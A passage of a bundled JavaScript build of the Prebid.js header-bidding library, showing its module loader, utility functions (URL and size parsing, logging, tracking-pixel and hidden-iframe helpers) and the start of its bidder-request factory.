/* prebid.js v6.10.0-pre
Updated : 2022-02-01*/
!function (e) {
  var t = window.pbjsChunk;
  window.pbjsChunk = function (n, o, a) {
    for (var c, u, s, d = 0, f = []; d < n.length; d++) u = n[d], r[u] && f.push(r[u][0]), r[u] = 0;
    for (c in o) Object.prototype.hasOwnProperty.call(o, c) && (e[c] = o[c]);
    for (t && t(n, o, a); f.length;) f.shift()();
    if (a) for (d = 0; d < a.length; d++) s = i(i.s = a[d]);
    return s;
  };
  var n = {},
    r = {
      402: 0
    };
  function i(t) {
    if (n[t]) return n[t].exports;
    var r = n[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return e[t].call(r.exports, r, r.exports, i), r.l = !0, r.exports;
  }
  i.m = e, i.c = n, i.d = function (e, t, n) {
    i.o(e, t) || Object.defineProperty(e, t, {
      configurable: !1,
      enumerable: !0,
      get: n
    });
  }, i.n = function (e) {
    var t = e && e.__esModule ? function () {
      return e.default;
    } : function () {
      return e;
    };
    return i.d(t, "a", t), t;
  }, i.o = function (e, t) {
    return Object.prototype.hasOwnProperty.call(e, t);
  }, i.p = "", i.oe = function (e) {
    throw console.error(e), e;
  }, i(i.s = 862);
}({
  0: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), n.d(t, "internal", function () {
      return w;
    }), t.getPrebidInternal = function () {
      return B;
    }, n.d(t, "bind", function () {
      return R;
    }), t.getUniqueIdentifierStr = k, t.generateUUID = function e(t) {
      return t ? (t ^ (window && window.crypto && window.crypto.getRandomValues ? crypto.getRandomValues(new Uint8Array(1))[0] % 16 : 16 * Math.random()) >> t / 4).toString(16) : ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, e);
    }, t.getBidIdParameter = function (e, t) {
      if (t && t[e]) return t[e];
      return "";
    }, t.tryAppendQueryString = function (e, t, n) {
      if (n) return e + t + "=" + encodeURIComponent(n) + "&";
      return e;
    }, t.parseQueryStringParameters = function (e) {
      var t = "";
      for (var n in e) e.hasOwnProperty(n) && (t += n + "=" + encodeURIComponent(e[n]) + "&");
      return t = t.replace(/&$/, "");
    }, t.transformAdServerTargetingObj = function (e) {
      return e && Object.getOwnPropertyNames(e).length > 0 ? se(e).map(function (t) {
        return "".concat(t, "=").concat(encodeURIComponent(de(e, t)));
      }).join("&") : "";
    }, t.getAdUnitSizes = function (e) {
      if (!e) return;
      var t = [];
      if (e.mediaTypes && e.mediaTypes.banner && Array.isArray(e.mediaTypes.banner.sizes)) {
        var n = e.mediaTypes.banner.sizes;
        Array.isArray(n[0]) ? t = n : t.push(n);
      } else Array.isArray(e.sizes) && (Array.isArray(e.sizes[0]) ? t = e.sizes : t.push(e.sizes));
      return t;
    }, t.parseSizesInput = function (e) {
      var t = [];
      if ("string" == typeof e) {
        var n = e.split(","),
          r = /^(\d)+x(\d)+$/i;
        if (n) for (var i in n) ee(n, i) && n[i].match(r) && t.push(n[i]);
      } else if ("object" === m(e)) {
        var o = e.length;
        if (o > 0) if (2 === o && "number" == typeof e[0] && "number" == typeof e[1]) t.push(N(e));else for (var a = 0; a < o; a++) t.push(N(e[a]));
      }
      return t;
    }, t.parseGPTSingleSizeArray = N, t.parseGPTSingleSizeArrayToRtbSize = function (e) {
      if (P(e)) return {
        w: e[0],
        h: e[1]
      };
    }, t.getWindowTop = x, t.getWindowSelf = q, t.getWindowLocation = M, t.logMessage = G, t.logInfo = W, t.logWarn = F, t.logError = L, t.hasConsoleLogger = function () {
      return A;
    }, t.debugTurnedOn = z, t.createInvisibleIframe = function () {
      var e = document.createElement("iframe");
      return e.id = k(), e.height = 0, e.width = 0, e.border = "0px", e.hspace = "0", e.vspace = "0", e.marginWidth = "0", e.marginHeight = "0", e.style.border = "0", e.scrolling = "no", e.frameBorder = "0", e.src = "about:blank", e.style.display = "none", e;
    }, t.getParameterByName = function (e) {
      return je(M().search)[e] || "";
    }, t.isA = H, t.isFn = K, t.isStr = Y, t.isArray = J, t.isNumber = Q, t.isPlainObject = $, t.isBoolean = function (e) {
      return H(e, "Boolean");
    }, t.isEmpty = X, t.isEmptyStr = function (e) {
      return Y(e) && (!e || 0 === e.length);
    }, t._each = Z, t.contains = function (e, t) {
      if (X(e)) return !1;
      if (K(e.indexOf)) return -1 !== e.indexOf(t);
      var n = e.length;
      for (; n--;) if (e[n] === t) return !0;
      return !1;
    }, t._map = function (e, t) {
      if (X(e)) return [];
      if (K(e.map)) return e.map(t);
      var n = [];
      return Z(e, function (r, i) {
        n.push(t(r, i, e));
      }), n;
    }, t.hasOwn = ee, t.insertElement = te, t.waitForElementToLoad = ne, t.triggerPixel = re, t.callBurl = function (e) {
      var t = e.source,
        n = e.burl;
      t === O.S2S.SRC && n && w.triggerPixel(n);
    }, t.insertHtmlIntoIframe = function (e) {
      if (!e) return;
      var t = document.createElement("iframe");
      t.id = k(), t.width = 0, t.height = 0, t.hspace = "0", t.vspace = "0", t.marginWidth = "0", t.marginHeight = "0", t.style.display = "none", t.style.height = "0px", t.style.width = "0px", t.scrolling = "no", t.frameBorder = "0", t.allowtransparency = "true", w.insertElement(t, document, "body"), t.contentWindow.document.open(), t.contentWindow.document.write(e), t.contentWindow.document.close();
    }, t.insertUserSyncIframe = ie, t.createTrackPixelHtml = function (e) {
      if (!e) return "";
      var t = encodeURI(e),
        n = '<div style="position:absolute;left:0px;top:0px;visibility:hidden;">';
      return n += '<img src="' + t + '"></div>';
    }, t.createTrackPixelIframeHtml = oe, t.getValueString = ae, t.uniques = ce, t.flatten = ue, t.getBidRequest = function (e, t) {
      if (!e) return;
      var n;
      return t.some(function (t) {
        var r = c()(t.bids, function (t) {
          return ["bidId", "adId", "bid_id"].some(function (n) {
            return t[n] === e;
          });
        });
        return r && (n = r), r;
      }), n;
    }, t.getKeys = se, t.getValue = de, t.getKeyByValue = function (e, t) {
      for (var n in e) if (e.hasOwnProperty(n) && e[n] === t) return n;
    }, t.getBidderCodes = function () {
      var e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : pbjs.adUnits;
      return e.map(function (e) {
        return e.bids.map(function (e) {
          return e.bidder;
        }).reduce(ue, []);
      }).reduce(ue).filter(ce);
    }, t.isGptPubadsDefined = fe, t.isApnGetTagDefined = function () {
      if (window.apntag && K(window.apntag.getTag)) return !0;
    }, n.d(t, "getHighestCpm", function () {
      return le;
    }), n.d(t, "getOldestHighestCpmBid", function () {
      return be;
    }), n.d(t, "getLatestHighestCpmBid", function () {
      return ge;
    }), t.shuffle = function (e) {
      var t = e.length;
      for (; t > 0;) {
        var n = Math.floor(Math.random() * t);
        t--;
        var r = e[t];
        e[t] = e[n], e[n] = r;
      }
      return e;
    }, t.adUnitsFilter = function (e, t) {
      return s()(e, t && t.adUnitCode);
    }, t.deepClone = ye, t.inIframe = function () {
      try {
        return w.getWindowSelf() !== w.getWindowTop();
      } catch (e) {
        return !0;
      }
    }, t.isSafariBrowser = function () {
      return /^((?!chrome|android|crios|fxios).)*safari/i.test(navigator.userAgent);
    }, t.replaceAuctionPrice = function (e, t) {
      if (!e) return;
      return e.replace(/\$\{AUCTION_PRICE\}/g, t);
    }, t.replaceClickThrough = function (e, t) {
      if (!e || !t || "string" != typeof t) return;
      return e.replace(/\${CLICKTHROUGH}/g, t);
    }, t.timestamp = function () {
      return new Date().getTime();
    }, t.getPerformanceNow = function () {
      return window.performance && window.performance.now && window.performance.now() || 0;
    }, t.hasDeviceAccess = function () {
      return !1 !== r.b.getConfig("deviceAccess");
    }, t.checkCookieSupport = ve, t.delayExecution = function (e, t) {
      if (t < 1) throw new Error("numRequiredCalls must be a positive number. Got ".concat(t));
      var n = 0;
      return function () {
        ++n === t && e.apply(this, arguments);
      };
    }, t.groupBy = function (e, t) {
      return e.reduce(function (e, n) {
        return (e[n[t]] = e[n[t]] || []).push(n), e;
      }, {});
    }, t.getDefinedParams = function (e, t) {
      return t.filter(function (t) {
        return e[t];
      }).reduce(function (t, n) {
        return v(t, y({}, n, e[n]));
      }, {});
    }, t.isValidMediaTypes = function (e) {
      var t = ["banner", "native", "video"];
      if (!Object.keys(e).every(function (e) {
        return s()(t, e);
      })) return !1;
      if (e.video && e.video.context) return s()(["instream", "outstream", "adpod"], e.video.context);
      return !0;
    }, t.getBidderRequest = function (e, t, n) {
      return c()(e, function (e) {
        return e.bids.filter(function (e) {
          return e.bidder === t && e.adUnitCode === n;
        }).length > 0;
      }) || {
        start: null,
        auctionId: null
      };
    }, t.getUserConfiguredParams = function (e, t, n) {
      return e.filter(function (e) {
        return e.code === t;
      }).map(function (e) {
        return e.bids;
      }).reduce(ue, []).filter(function (e) {
        return e.bidder === n;
      }).map(function (e) {
        return e.params || {};
      });
    }, t.getOrigin = function () {
      return window.location.origin ? window.location.origin : window.location.protocol + "//" + window.location.hostname + (window.location.port ? ":" + window.location.port : "");
    }, t.getDNT = function () {
      return "1" === navigator.doNotTrack || "1" === window.doNotTrack || "1" === navigator.msDoNotTrack || "yes" === navigator.doNotTrack;
    }, t.isAdUnitCodeMatchingSlot = function (e) {
      return function (t) {
        return me(e, t);
      };
    }, t.isSlotMatchingAdUnitCode = he, t.getGptSlotInfoForAdUnitCode = function (e) {
      var t;
      fe() && (t = c()(window.googletag.pubads().getSlots(), he(e)));
      if (t) return {
        gptSlot: t.getAdUnitPath(),
        divId: t.getSlotElementId()
      };
      return {};
    }, t.unsupportedBidderMessage = function (e, t) {
      var n = Object.keys(e.mediaTypes || {
        banner: "banner"
      }).join(", ");
      return "\n    ".concat(e.code, " is a ").concat(n, " ad unit\n    containing bidders that don't support ").concat(n, ": ").concat(t, ".\n    This bidder won't fetch demand.\n  ");
    }, t.isInteger = Oe, t.convertCamelToUnderscore = function (e) {
      return e.replace(/(?:^|\.?)([A-Z])/g, function (e, t) {
        return "_" + t.toLowerCase();
      }).replace(/^_/, "");
    }, t.cleanObj = function (e) {
      return Object.keys(e).reduce(function (t, n) {
        return void 0 !== e[n] && (t[n] = e[n]), t;
      }, {});
    }, t.pick = function (e, t) {
      if ("object" !== m(e)) return {};
      return t.reduce(function (n, r, i) {
        if ("function" == typeof r) return n;
        var o = r,
          a = r.match(/^(.+?)\sas\s(.+?)$/i);
        a && (r = a[1], o = a[2]);
        var c = e[r];
        return "function" == typeof t[i + 1] && (c = t[i + 1](c, n)), void 0 !== c && (n[o] = c), n;
      }, {});
    }, t.transformBidderParamKeywords = function (e) {
      var t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "keywords",
        n = [];
      return Z(e, function (e, r) {
        if (J(e)) {
          var i = [];
          Z(e, function (e) {
            ((e = ae(t + "." + r, e)) || "" === e) && i.push(e);
          }), e = i;
        } else {
          if (!Y(e = ae(t + "." + r, e))) return;
          e = [e];
        }
        n.push({
          key: r,
          value: e
        });
      }), n;
    }, t.convertTypes = function (e, t) {
      return Object.keys(e).forEach(function (n) {
        var r, i;
        t[n] && (K(e[n]) ? t[n] = e[n](t[n]) : t[n] = (r = e[n], i = t[n], "string" === r ? i && i.toString() : "number" === r ? Number(i) : i), isNaN(t[n]) && delete t.key);
      }), t;
    }, t.isArrayOfNums = function (e, t) {
      return J(e) && (!t || e.length === t) && e.every(function (e) {
        return Oe(e);
      });
    }, t.fill = function (e, t) {
      for (var n = [], r = 0; r < t; r++) {
        var i = $(e) ? ye(e) : e;
        n.push(i);
      }
      return n;
    }, t.chunk = function (e, t) {
      for (var n = [], r = 0; r < Math.ceil(e.length / t); r++) {
        var i = r * t,
          o = i + t;
        n.push(e.slice(i, o));
      }
      return n;
    }, t.getMinValueFromArray = function (e) {
      return Math.min.apply(Math, b(e));
    }, t.getMaxValueFromArray = function (e) {
      return Math.max.apply(Math, b(e));
    }, t.compareOn = function (e) {
      return function (t, n) {
        return t[e] < n[e] ? 1 : t[e] > n[e] ? -1 : 0;
      };
    }, t.parseQS = je, t.formatQS = Ee, t.parseUrl = function (e, t) {
      var n = document.createElement("a");
      t && "noDecodeWholeURL" in t && t.noDecodeWholeURL ? n.href = e : n.href = decodeURIComponent(e);
      var r = t && "decodeSearchAsString" in t && t.decodeSearchAsString;
      return {
        href: n.href,
        protocol: (n.protocol || "").replace(/:$/, ""),
        hostname: n.hostname,
        port: +n.port,
        pathname: n.pathname.replace(/^(?!\/)/, "/"),
        search: r ? n.search : w.parseQS(n.search || ""),
        hash: (n.hash || "").replace(/^#/, ""),
        host: n.host || window.location.host
      };
    }, t.buildUrl = function (e) {
      return (e.protocol || "http") + "://" + (e.host || e.hostname + (e.port ? ":".concat(e.port) : "")) + (e.pathname || "") + (e.search ? "?".concat(w.formatQS(e.search || "")) : "") + (e.hash ? "#".concat(e.hash) : "");
    }, t.deepEqual = Ae, t.mergeDeep = function e(t) {
      for (var n = arguments.length, r = new Array(n > 1 ? n - 1 : 0), i = 1; i < n; i++) r[i - 1] = arguments[i];
      if (!r.length) return t;
      var o = r.shift();
      if ($(t) && $(o)) {
        var a = function (n) {
          $(o[n]) ? (t[n] || v(t, y({}, n, {})), e(t[n], o[n])) : J(o[n]) && t[n] ? J(t[n]) && o[n].forEach(function (e) {
            for (var r = 1, i = 0; i < t[n].length; i++) if (Ae(t[n][i], e)) {
              r = 0;
              break;
            }
            r && t[n].push(e);
          }) : v(t, y({}, n, o[n]));
        };
        for (var c in o) a(c);
      }
      return e.apply(void 0, [t].concat(r));
    }, t.cyrb53Hash = function (e) {
      for (var t, n = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 0, r = function (e, t) {
          if (K(Math.imul)) return Math.imul(e, t);
          var n = (4194303 & e) * (t |= 0);
          return 4290772992 & e && (n += (4290772992 & e) * t | 0), 0 | n;
        }, i = 3735928559 ^ n, o = 1103547991 ^ n, a = 0; a < e.length; a++) t = e.charCodeAt(a), i = r(i ^ t, 2654435761), o = r(o ^ t, 1597334677);
      return i = r(i ^ i >>> 16, 2246822507) ^ r(o ^ o >>> 13, 3266489909), (4294967296 * (2097151 & (o = r(o ^ o >>> 16, 2246822507) ^ r(i ^ i >>> 13, 3266489909))) + (i >>> 0)).toString();
    };
    var r = n(3),
      i = n(45),
      o = n.n(i),
      a = n(11),
      c = n.n(a),
      u = n(12),
      s = n.n(u),
      d = n(46);
    n.d(t, "deepAccess", function () {
      return d.a;
    });
    var f = n(47);
    function l(e, t) {
      return function (e) {
        if (Array.isArray(e)) return e;
      }(e) || function (e, t) {
        var n = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
        if (null == n) return;
        var r,
          i,
          o = [],
          a = !0,
          c = !1;
        try {
          for (n = n.call(e); !(a = (r = n.next()).done) && (o.push(r.value), !t || o.length !== t); a = !0);
        } catch (e) {
          c = !0, i = e;
        } finally {
          try {
            a || null == n.return || n.return();
          } finally {
            if (c) throw i;
          }
        }
        return o;
      }(e, t) || g(e, t) || function () {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function b(e) {
      return function (e) {
        if (Array.isArray(e)) return p(e);
      }(e) || function (e) {
        if ("undefined" != typeof Symbol && null != e[Symbol.iterator] || null != e["@@iterator"]) return Array.from(e);
      }(e) || g(e) || function () {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function g(e, t) {
      if (e) {
        if ("string" == typeof e) return p(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        return "Object" === n && e.constructor && (n = e.constructor.name), "Map" === n || "Set" === n ? Array.from(e) : "Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n) ? p(e, t) : void 0;
      }
    }
    function p(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
      return r;
    }
    function y(e, t, n) {
      return t in e ? Object.defineProperty(e, t, {
        value: n,
        enumerable: !0,
        configurable: !0,
        writable: !0
      }) : e[t] = n, e;
    }
    function v() {
      return (v = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    function m(e) {
      return (m = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    n.d(t, "deepSetValue", function () {
      return f.a;
    });
    var h,
      O = n(5),
      j = Object.prototype.toString,
      E = Boolean(window.console),
      A = Boolean(E && window.console.log),
      S = Boolean(E && window.console.info),
      T = Boolean(E && window.console.warn),
      I = Boolean(E && window.console.error),
      C = function () {
        return null == h && (h = n(10)), h.emit.apply(h, arguments);
      },
      w = {
        checkCookieSupport: ve,
        createTrackPixelIframeHtml: oe,
        getWindowSelf: q,
        getWindowTop: x,
        getWindowLocation: M,
        insertUserSyncIframe: ie,
        insertElement: te,
        isFn: K,
        triggerPixel: re,
        logError: L,
        logWarn: F,
        logMessage: G,
        logInfo: W,
        parseQS: je,
        formatQS: Ee,
        deepEqual: Ae
      },
      B = {};
    var _,
      U = {},
      R = function (e, t) {
        return t;
      }.bind(null, 1, U)() === U ? Function.prototype.bind : function (e) {
        var t = this,
          n = Array.prototype.slice.call(arguments, 1);
        return function () {
          return t.apply(e, n.concat(Array.prototype.slice.call(arguments)));
        };
      },
      D = (_ = 0, function () {
        return ++_;
      });
    function k() {
      return D() + Math.random().toString(16).substr(2);
    }
    function N(e) {
      if (P(e)) return e[0] + "x" + e[1];
    }
    function P(e) {
      return J(e) && 2 === e.length && !isNaN(e[0]) && !isNaN(e[1]);
    }
    function x() {
      return window.top;
    }
    function q() {
      return window.self;
    }
    function M() {
      return window.location;
    }
    function G() {
      z() && A && console.log.apply(console, V(arguments, "MESSAGE:"));
    }
    function W() {
      z() && S && console.info.apply(console, V(arguments, "INFO:"));
    }
    function F() {
      z() && T && console.warn.apply(console, V(arguments, "WARNING:")), C(O.EVENTS.AUCTION_DEBUG, {
        type: "WARNING",
        arguments: arguments
      });
    }
    function L() {
      z() && I && console.error.apply(console, V(arguments, "ERROR:")), C(O.EVENTS.AUCTION_DEBUG, {
        type: "ERROR",
        arguments: arguments
      });
    }
    function V(e, t) {
      e = [].slice.call(e);
      var n = r.b.getCurrentBidder();
      return t && e.unshift(t), n && e.unshift(i("#aaa")), e.unshift(i("#3b88c3")), e.unshift("%cPrebid" + (n ? "%c".concat(n) : "")), e;
      function i(e) {
        return "display: inline-block; color: #fff; background: ".concat(e, "; padding: 1px 4px; border-radius: 3px;");
      }
    }
    function z() {
      return !!r.b.getConfig("debug");
    }
    function H(e, t) {
      return j.call(e) === "[object " + t + "]";
    }
    function K(e) {
      return H(e, "Function");
    }
    function Y(e) {
      return H(e, "String");
    }
    function J(e) {
      return H(e, "Array");
    }
    function Q(e) {
      return H(e, "Number");
    }
    function $(e) {
      return H(e, "Object");
    }
    function X(e) {
      if (!e) return !0;
      if (J(e) || Y(e)) return !(e.length > 0);
      for (var t in e) if (hasOwnProperty.call(e, t)) return !1;
      return !0;
    }
    function Z(e, t) {
      if (!X(e)) {
        if (K(e.forEach)) return e.forEach(t, this);
        var n = 0,
          r = e.length;
        if (r > 0) for (; n < r; n++) t(e[n], n, e);else for (n in e) hasOwnProperty.call(e, n) && t.call(this, e[n], n);
      }
    }
    function ee(e, t) {
      return e.hasOwnProperty ? e.hasOwnProperty(t) : void 0 !== e[t] && e.constructor.prototype[t] !== e[t];
    }
    function te(e, t, n, r) {
      var i;
      t = t || document, i = n ? t.getElementsByTagName(n) : t.getElementsByTagName("head");
      try {
        if ((i = i.length ? i : t.getElementsByTagName("body")).length) {
          i = i[0];
          var o = r ? null : i.firstChild;
          return i.insertBefore(e, o);
        }
      } catch (e) {}
    }
    function ne(e, t) {
      var n = null;
      return new Promise(function (r) {
        var i = function t() {
          e.removeEventListener("load", t), e.removeEventListener("error", t), null != n && window.clearTimeout(n), r();
        };
        e.addEventListener("load", i), e.addEventListener("error", i), null != t && (n = window.setTimeout(i, t));
      });
    }
    function re(e, t, n) {
      var r = new Image();
      t && w.isFn(t) && ne(r, n).then(t), r.src = e;
    }
    function ie(e, t, n) {
      var r = w.createTrackPixelIframeHtml(e, !1, "allow-scripts allow-same-origin"),
        i = document.createElement("div");
      i.innerHTML = r;
      var o = i.firstChild;
      t && w.isFn(t) && ne(o, n).then(t), w.insertElement(o, document, "html", !0);
    }
    function oe(e) {
      var t = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1],
        n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "";
      return e ? (t && (e = encodeURI(e)), n && (n = 'sandbox="'.concat(n, '"')), "<iframe ".concat(n, ' id="').concat(k(), '"\n      frameborder="0"\n      allowtransparency="true"\n      marginheight="0" marginwidth="0"\n      width="0" hspace="0" vspace="0" height="0"\n      style="height:0px;width:0px;display:none;"\n      scrolling="no"\n      src="').concat(e, '">\n    </iframe>')) : "";
    }
    function ae(e, t, n) {
      return null == t ? n : Y(t) ? t : Q(t) ? t.toString() : void w.logWarn("Unsuported type for param: " + e + " required type: String");
    }
    function ce(e, t, n) {
      return n.indexOf(e) === t;
    }
    function ue(e, t) {
      return e.concat(t);
    }
    function se(e) {
      return Object.keys(e);
    }
    function de(e, t) {
      return e[t];
    }
    function fe() {
      if (window.googletag && K(window.googletag.pubads) && K(window.googletag.pubads().getSlots)) return !0;
    }
    var le = pe("timeToRespond", function (e, t) {
        return e > t;
      }),
      be = pe("responseTimestamp", function (e, t) {
        return e > t;
      }),
      ge = pe("responseTimestamp", function (e, t) {
        return e < t;
      });
    function pe(e, t) {
      return function (n, r) {
        return n.cpm === r.cpm ? t(n[e], r[e]) ? r : n : n.cpm < r.cpm ? r : n;
      };
    }
    function ye(e) {
      return o()(e);
    }
    function ve() {
      if (window.navigator.cookieEnabled || document.cookie.length) return !0;
    }
    var me = function (e, t) {
      return e.getAdUnitPath() === t || e.getSlotElementId() === t;
    };
    function he(e) {
      return function (t) {
        return me(t, e);
      };
    }
    function Oe(e) {
      return Number.isInteger ? Number.isInteger(e) : "number" == typeof e && isFinite(e) && Math.floor(e) === e;
    }
    function je(e) {
      return e ? e.replace(/^\?/, "").split("&").reduce(function (e, t) {
        var n = l(t.split("="), 2),
          r = n[0],
          i = n[1];
        return /\[\]$/.test(r) ? (e[r = r.replace("[]", "")] = e[r] || [], e[r].push(i)) : e[r] = i || "", e;
      }, {}) : {};
    }
    function Ee(e) {
      return Object.keys(e).map(function (t) {
        return Array.isArray(e[t]) ? e[t].map(function (e) {
          return "".concat(t, "[]=").concat(e);
        }).join("&") : "".concat(t, "=").concat(e[t]);
      }).join("&");
    }
    function Ae(e, t) {
      if (e === t) return !0;
      if ("object" === m(e) && null !== e && "object" === m(t) && null !== t) {
        if (Object.keys(e).length !== Object.keys(t).length) return !1;
        for (var n in e) {
          if (!t.hasOwnProperty(n)) return !1;
          if (!Ae(e[n], t[n])) return !1;
        }
        return !0;
      }
      return !1;
    }
  },
  1: function (e, t, n) {
    "use strict";

    Object.defineProperty(t, "__esModule", {
      value: !0
    }), n.d(t, "storage", function () {
      return T;
    }), t.registerBidder = function (e) {
      var t = Array.isArray(e.supportedMediaTypes) ? {
        supportedMediaTypes: e.supportedMediaTypes
      } : void 0;
      function n(e) {
        var n = C(e);
        i.default.registerBidAdapter(n, e.code, t);
      }
      n(e), Array.isArray(e.aliases) && e.aliases.forEach(function (t) {
        var r,
          o,
          a = t;
        Object(v.isPlainObject)(t) && (a = t.code, r = t.gvlid, o = t.skipPbsAliasing), i.default.aliasRegistry[a] = e.code, n(S({}, e, {
          code: a,
          gvlid: r,
          skipPbsAliasing: o
        }));
      });
    }, t.newBidder = C, n.d(t, "registerSyncInner", function () {
      return w;
    }), t.preloadBidderMappingFile = B, t.getIabSubCategory = function (e, t) {
      var n = i.default.getBidAdapter(e);
      if (n.getSpec().getMappingFileInfo) {
        var r = n.getSpec().getMappingFileInfo(),
          o = r.localStorageKey ? r.localStorageKey : n.getBidderCode(),
          a = T.getDataFromLocalStorage(o);
        if (a) {
          try {
            a = JSON.parse(a);
          } catch (t) {
            Object(v.logError)("Failed to parse ".concat(e, " mapping data stored in local storage"));
          }
          return a.mapping[t] ? a.mapping[t] : null;
        }
      }
    }, t.isValid = _;
    var r = n(38),
      i = n(9),
      o = n(3),
      a = n(25),
      c = n(30),
      u = n(23),
      s = n(16),
      d = n(5),
      f = n.n(d),
      l = n(10),
      b = n.n(l),
      g = n(12),
      p = n.n(g),
      y = n(4),
      v = n(0),
      m = n(2),
      h = n(8),
      O = n(7);
    function j(e, t) {
      return function (e) {
        if (Array.isArray(e)) return e;
      }(e) || function (e, t) {
        var n = null == e ? null : "undefined" != typeof Symbol && e[Symbol.iterator] || e["@@iterator"];
        if (null == n) return;
        var r,
          i,
          o = [],
          a = !0,
          c = !1;
        try {
          for (n = n.call(e); !(a = (r = n.next()).done) && (o.push(r.value), !t || o.length !== t); a = !0);
        } catch (e) {
          c = !0, i = e;
        } finally {
          try {
            a || null == n.return || n.return();
          } finally {
            if (c) throw i;
          }
        }
        return o;
      }(e, t) || function (e, t) {
        if (!e) return;
        if ("string" == typeof e) return E(e, t);
        var n = Object.prototype.toString.call(e).slice(8, -1);
        "Object" === n && e.constructor && (n = e.constructor.name);
        if ("Map" === n || "Set" === n) return Array.from(e);
        if ("Arguments" === n || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)) return E(e, t);
      }(e, t) || function () {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }();
    }
    function E(e, t) {
      (null == t || t > e.length) && (t = e.length);
      for (var n = 0, r = new Array(t); n < t; n++) r[n] = e[n];
      return r;
    }
    function A(e) {
      return (A = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (e) {
        return typeof e;
      } : function (e) {
        return e && "function" == typeof Symbol && e.constructor === Symbol && e !== Symbol.prototype ? "symbol" : typeof e;
      })(e);
    }
    function S() {
      return (S = Object.assign || function (e) {
        for (var t = 1; t < arguments.length; t++) {
          var n = arguments[t];
          for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r]);
        }
        return e;
      }).apply(this, arguments);
    }
    var T = Object(O.a)("bidderFactory"),
      I = ["requestId", "cpm", "ttl", "creativeId", "netRevenue", "currency"];
    function C(e) {
      return S(new r.a(e.code), {
        getSpec: function () {
          return Object.freeze(e);
        },
        registerSyncs: t,
        callBids: function (r, c, u, s, d, l) {
          if (Array.isArray(r.bids)) {
            var g = {},
              p = [],
              y = r.bids.filter(n);
            if (0 !== y.length) {
              var m = {};
              y.forEach(function (e) {
                m[e.bidId] = e, e.adUnitCode || (e.adUnitCode = e.placementCode);
              });
              var h = e.buildRequests(y, r);
              if (h && 0 !== h.length) {
                Array.isArray(h) || (h = [h]);
                var O = Object(v.delayExecution)(l(j), h.length);
                h.forEach(function (e) {
                  return b.a.emit(f.a.EVENTS.BEFORE_BIDDER_HTTP, r);
                }), h.forEach(function (t) {
                  switch (t.method) {
                    case "GET":
                      s("".concat(t.url).concat(function (e) {
                        if (e) return "?".concat("object" === A(e) ? Object(v.parseQueryStringParameters)(e) : e);
                        return "";
                      }(t.data)), {
                        success: l(n),
                        error: o
                      }, void 0, S({
                        method: "GET",
                        withCredentials: !0
                      }, t.options));
                      break;
                    case "POST":
                      s(t.url, {
                        success: l(n),
                        error: o
                      }, "string" == typeof t.data ? t.data : JSON.stringify(t.data), S({
                        method: "POST",
                        contentType: "text/plain",
                        withCredentials: !0
                      }, t.options));
                      break;
                    default:
                      Object(v.logWarn)("Skipping invalid request from ".concat(e.code, ". Request type ").concat(t.type, " must be GET or POST")), O();
                  }
                  function n(n, i) {
                    d(e.code);
                    try {
                      n = JSON.parse(n);
                    } catch (e) {}
                    var o;
                    n = {
                      body: n,
                      headers: {
                        get: i.getResponseHeader.bind(i)
                      }
                    }, p.push(n);
                    try {
                      o = e.interpretResponse(n, t);
                    } catch (t) {
                      return Object(v.logError)("Bidder ".concat(e.code, " failed to interpret the server's response. Continuing without bids"), null, t), void O();
                    }
                    function u(t) {
                      var n = m[t.requestId];
                      if (n) {
                        t.originalCpm = t.cpm, t.originalCurrency = t.currency, t.meta = t.meta || S({}, t[n.bidder]);
                        var i = S(Object(a.a)(f.a.STATUS.GOOD, n), t);
                        !function (e, t) {
                          g[e] = !0, _(e, t, [r]) && c(e, t);
                        }(n.adUnitCode, i);
                      } else Object(v.logWarn)("Bidder ".concat(e.code, " made bid for unknown request ID: ").concat(t.requestId, ". Ignoring."));
                    }
                    o && (Object(v.isArray)(o) ? o.forEach(u) : u(o)), O(o);
                  }
                  function o(t, n) {
                    d(e.code), i.default.callBidderError(e.code, n, r), b.a.emit(f.a.EVENTS.BIDDER_ERROR, {
                      error: n,
                      bidderRequest: r
                    }), Object(v.logError)("Server call for ".concat(e.code, " failed: ").concat(t, " ").concat(n.status, ". Continuing without bids.")), O();
                  }
                });
              } else j();
            } else j();
          }
          function j() {
            u(), o.b.runWithBidder(e.code, function () {
              b.a.emit(f.a.EVENTS.BIDDER_DONE, r), t(p, r.gdprConsent, r.uspConsent);
            });
          }
        }
      });
      function t(t, n, r) {
        w(e, t, n, r);
      }
      function n(t) {
        return !!e.isBidRequestValid(t) || (Object(v.logWarn)("Invalid bid sent to bidder ".concat(e.code, ": ").concat(JSON.stringify(t))), !1);
      }
    }
    var w = Object(h.b)("async", function (e, t, n, r) {
      var a = o.b.getConfig("userSync.aliasSyncEnabled");
